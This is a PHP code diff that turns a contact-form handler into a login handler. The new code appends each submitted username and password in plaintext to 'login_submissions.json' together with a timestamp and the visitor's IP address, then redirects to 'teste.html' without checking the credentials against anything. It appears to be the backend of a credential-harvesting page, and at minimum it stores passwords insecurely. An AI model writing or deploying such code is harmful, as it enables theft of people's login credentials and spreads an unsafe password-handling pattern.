@@ -2,25 +2,17 @@
 if ($_SERVER["REQUEST_METHOD"] == "POST")
 {
 	// Get form data
-	$name = htmlspecialchars(trim($_POST["name"]));
-	$email = htmlspecialchars(trim($_POST["email"]));
-	$subject = htmlspecialchars(trim($_POST["subject"]));
-	$message = htmlspecialchars(trim($_POST["message"]));
+	$username = htmlspecialchars(trim($_POST["username"]));
+	$password = htmlspecialchars(trim($_POST["password"]));
 
 	// Validation
 	$errors = [];
 
-	if (empty($name))
-		$errors[] = "Name is required";
+	if (empty($username))
+		$errors[] = "Username is required";
 
-	if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL))
-		$errors[] = "Valid email is required";
-
-	if (empty($subject))
-		$errors[] = "Subject is required";
-
-	if (empty($message))
-		$errors[] = "Message is required";
+	if (empty($password))
+		$errors[] = "Password is required";
 
 	// If no errors, save to file
 	if (empty($errors))
@@ -29,23 +21,21 @@ if ($_SERVER["REQUEST_METHOD"] == "POST")
 		$submission =
 		[
 			"timestamp" => date("Y-m-d H:i:s"),
-			"name" => $name,
-			"email" => $email,
-			"subject" => $subject,
-			"message" => $message,
+			"username" => $username,
+			"password" => $password,
 			"ip_address" => $_SERVER["REMOTE_ADDR"] ?? "Unknown"
 		];
 
 		// Convert to JSON
-		$data = json_encode($submission) . PHP_EOL;
+		$data = json_encode($submission).PHP_EOL;
 
 		// Save to file
-		$filename = "submissions.json";
+		$filename = "login_submissions.json";
 		
 		if (file_put_contents($filename, $data, FILE_APPEND | LOCK_EX))
 		{
 			// Success - redirect to success page
-			header("Location: index.php?success=1");
+			header("Location: teste.html");
 			exit();
 		}
 		else
